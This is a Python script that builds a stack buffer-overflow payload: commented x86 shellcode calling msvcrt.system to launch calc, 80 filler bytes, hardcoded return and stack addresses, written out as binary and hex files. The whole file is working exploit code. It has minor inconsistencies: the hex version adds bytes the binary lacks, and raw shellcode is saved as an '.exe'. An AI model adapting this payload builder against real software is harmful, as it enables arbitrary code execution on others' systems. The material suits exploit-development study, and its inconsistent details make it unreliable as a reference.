import re

# Original shellcode (with comments)
raw_shellcode = '''"\\x89\\xE5"   // MOV EBP,ESP
"\\x31\\xFF"            // XOR EDI,EDI (EDI=0)
"\\x57"                // PUSH EDI
"\\x57"                // PUSH EDI
"\\xC6\\x45\\xF8\\x63"    // MOV BYTE PTR SS:[EBP-8],63 "c"
"\\xC6\\x45\\xF9\\x61"    // MOV BYTE PTR SS:[EBP-7],61 "a"
"\\xC6\\x45\\xFA\\x6C"    // MOV BYTE PTR SS:[EBP-6],6C "l"
"\\xC6\\x45\\xFB\\x63"    // MOV BYTE PTR SS:[EBP-5],63 "c"
"\\x8D\\x45\\xF8"        // LEA EAX,DWORD PTR SS:[EBP-8] "calc"
"\\x50"                // PUSH EAX
"\\xB8\\xC7\\x93\\xBF\\x77"// MOV EAX,msvcrt.system
"\\xFF\\xD0"            // CALL EAX
'''

# Extract all \x.. format bytes
bytes_hex = re.findall(r'\\x[0-9a-fA-F]{2}', raw_shellcode)
shellcode_bytes = bytes(int(b[2:], 16) for b in bytes_hex)

with open('launch_calc.exe', 'wb') as f:
    f.write(shellcode_bytes)

# Write binary format to file
with open('shellcode.bin', 'wb') as f:
    f.write(bytes([0x37] * 80)) # 80 dummy bytes
    # Write the additional values in little-endian format
    f.write(bytes.fromhex('37FF4002'))  # 0240FF37
    f.write(bytes.fromhex('BE1D4037'))  # 37401DBE
    f.write(bytes.fromhex('37373737'))  # 37373737
    f.write(bytes.fromhex('37373737'))  # 37373737
    f.write(bytes.fromhex('60FF4002'))  # 0240FF60
    f.write(bytes.fromhex('28FF4002'))  # 0240FF28
    f.write(shellcode_bytes)

# # Write hex text format to file
# Write hex text format to file
with open('shellcode.hex', 'w') as f:
    # Write 80 dummy bytes
    f.write(' '.join([f'{0x37:02X}' for _ in range(80)]))
    # Write additional values
    f.write(' 37 FF 40 02 BE 1D 40 37 09 37 37 37 01 37 37 37 60 FF 40 02 28 FF 40 02')
    # Write shellcode bytes
    f.write(' ' + ' '.join([f'{b:02X}' for b in shellcode_bytes]))
    

# print(f"Shellcode written to 'shellcode.bin' and 'shellcode.hex' ({len(shellcode_bytes) + 12} bytes).")